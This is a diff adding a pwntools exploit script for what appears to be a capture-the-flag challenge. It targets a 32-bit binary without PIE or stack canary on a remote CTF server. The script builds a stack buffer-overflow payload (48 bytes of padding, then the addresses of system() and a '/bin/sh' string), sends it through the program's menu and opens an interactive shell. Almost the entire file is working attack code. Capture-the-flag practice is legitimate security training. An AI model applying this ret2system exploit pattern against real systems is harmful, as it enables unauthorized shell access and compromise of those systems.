@@ -1,0 +1,59 @@
+from pwn import *
+import subprocess
+import os
+import sys
+sys.path.append("../CTF_setup/Utils")
+from utils import *
+from file_struct import *
+
+exe = ELF("./vuln_patched")
+context.binary = exe
+
+final = 1
+
+
+enc = lambda a: a.encode() if isinstance(a, str) else a
+sla = lambda a, b: io.sendlineafter(enc(a), enc(b))
+snl = lambda a: io.sendline(enc(a))
+sna = lambda a, b: io.sendafter(enc(a), enc(b))
+snd = lambda a: io.send(enc(a))
+rcu = lambda a: io.recvuntil(enc(a), drop=True)
+rcv = lambda a: io.recv(enc(a))
+rcl = lambda: io.recvline()
+p24 = lambda a: p32(a)[:-1]
+l64 = lambda a: u64(a.ljust(8, b"\x00"))
+l32 = lambda a: u64(a.ljust(4, b"\x00"))
+l16 = lambda a: u64(a.ljust(2, b"\x00"))
+sen = lambda a: str(a).encode()
+mangle = lambda ptr, pos: ptr ^ (pos >> 12)
+
+def debug():
+    pid = io.proc.pid
+    subprocess.run(["gnome-terminal", "--", "zsh", "-c", "gdb -nx -x ../CTF_setup/Utils/custom_gdb.py -x g -p " + str(pid)])
+
+if final == 1:
+    io = remote("chall.0xfun.org",  4163)
+else:
+    io = process()
+
+
+
+''' let's pwn '''
+'''nopie nocanary 32bits'''
+binsh = 0x0804a09a
+syst  = 0x080490a0
+
+pl = b"a"*48
+pl += p32(syst)
+pl += p32(binsh)
+pl += p32(binsh)
+
+sla(b"Exit", b"2")
+
+sla(b"up to 32", pl)
+''' end '''
+
+
+io.interactive()
+
+
